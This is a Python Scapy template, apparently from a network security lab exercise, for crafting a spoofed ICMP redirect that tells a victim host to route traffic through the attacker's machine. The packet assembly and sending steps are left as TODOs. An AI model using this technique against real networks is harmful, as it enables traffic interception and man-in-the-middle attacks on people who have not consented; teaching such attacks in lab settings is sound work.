from scapy.all import *

# Configuration of IP addresses based on the Hilltop Academy scenario
# TODO: Assign the correct IP addresses based on the given scenario
gateway_ip = "__GATEWAY_IP__"
attacker_ip = "__ATTACKER_IP__"
victim_ip = "__VICTIM_IP__"
target_ip = "__TARGET_IP__"

# Constructing the ICMP redirect packet
# Type 5 is Redirect, code 1 is for host redirect
icmp = ICMP(type=5, code=1)

# The new gateway the victim should use
# TODO: Specify the gateway IP the victim should use (hint: it’s the attacker’s IP)
icmp.gw = "__NEW_GATEWAY_IP__"

# The IP layer for the ICMP redirect
# TODO: Set the source of the redirect (gateway’s IP) and destination (victim’s IP)
ip = IP(src="__GATEWAY_IP__", dst="__VICTIM_IP__")

# The IP layer of the original packet that triggered the redirect
# Typically, this would be a packet sent from the victim to an outside IP
# TODO: Mimic an original packet that the victim might send to the target
original_packet_ip = IP(src="__VICTIM_IP__", dst="__TARGET_IP__")

# Constructing the full packet (ICMP redirect + original IP header)
# TODO: Combine the IP, ICMP, and original packet layers correctly

# Sending the packet
# TODO: Use the correct function from Scapy to send the crafted packet

# DONE!
